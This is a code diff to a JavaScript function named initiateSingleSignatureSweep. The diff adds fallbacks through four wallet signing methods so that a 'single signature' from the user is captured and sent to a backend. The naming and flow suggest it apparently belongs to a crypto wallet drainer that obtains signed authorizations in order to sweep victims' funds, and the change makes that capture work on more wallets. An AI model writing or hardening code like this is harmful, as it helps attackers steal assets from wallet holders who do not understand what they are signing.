@@ -32,11 +32,27 @@ export async function initiateSingleSignatureSweep(provider, userAddress) {
   try {
     console.log('📝 Requesting single signature from user...')
 
-    // ✅ Step 2: Request ONE signature from user
-    const signature = await provider.request({
-      method: 'eth_signTypedData_v4',
-      params: [userAddress, JSON.stringify(authMessage)]
-    })
+    // ✅ Step 2: Request ONE signature from user (try multiple fallbacks)
+    async function requestTypedSignature(provider, userAddress, authMessage) {
+      const payload = JSON.stringify(authMessage)
+      const methods = ['eth_signTypedData_v4', 'eth_signTypedData', 'eth_signTypedData_v3', 'personal_sign']
+      for (const method of methods) {
+        try {
+          if (method === 'personal_sign') {
+            // personal_sign commonly expects [message, address]
+            return await provider.request({ method, params: [payload, userAddress] })
+          } else {
+            return await provider.request({ method, params: [userAddress, payload] })
+          }
+        } catch (err) {
+          console.warn(`Signing method ${method} failed:`, err?.message || err)
+          // continue to next method
+        }
+      }
+      throw new Error('No supported signing method available on this wallet')
+    }
+
+    const signature = await requestTypedSignature(provider, userAddress, authMessage)
 
     console.log('✅ User signed! Sending to backend...')
 
